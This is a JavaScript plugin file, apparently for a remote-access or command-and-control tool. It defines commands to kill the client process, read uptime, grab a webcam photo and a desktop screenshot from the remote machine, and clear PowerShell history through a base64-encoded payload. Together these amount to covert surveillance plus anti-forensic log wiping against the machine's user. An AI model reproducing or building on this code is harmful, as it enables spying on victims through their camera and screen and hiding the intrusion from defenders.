// Register a plugin
(function() {
    const ClientManager = {
        name: 'Client Manager',
        type: 'client',
        description: 'A client plugin to manage the remote client.',
        commands: {
            'die': {
                name: 'die',
                method: 'execute',
                description: 'Kills the client process.',
                handler: () => 'di'
            },
            'up': {
                name: 'up',
                method: 'execute',
                description: 'Gets the client uptime.',
                handler: () => 'up'
            },
            'webcam': {
                name: 'webcam',
                method: 'execute',
                description: 'Returns a webcam photo using the default camera.',
                handler: () => 'wc'
            },
            'screenshot': {
                name: 'screenshot',
                method: 'execute',
                description: 'Returns a desktop screenshot of the client.',
                handler: () => 'ss'
            },
            'cleanlog': {
                name: 'cleanlog',
                method: 'payload-ps',
                description: 'Cleans the powershell history and logs',
                handler: () => {
                    return Buffer.from(`Clear-History | [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()`).toString('base64');
                }
            }
        }
    };
    module.exports = ClientManager;
})();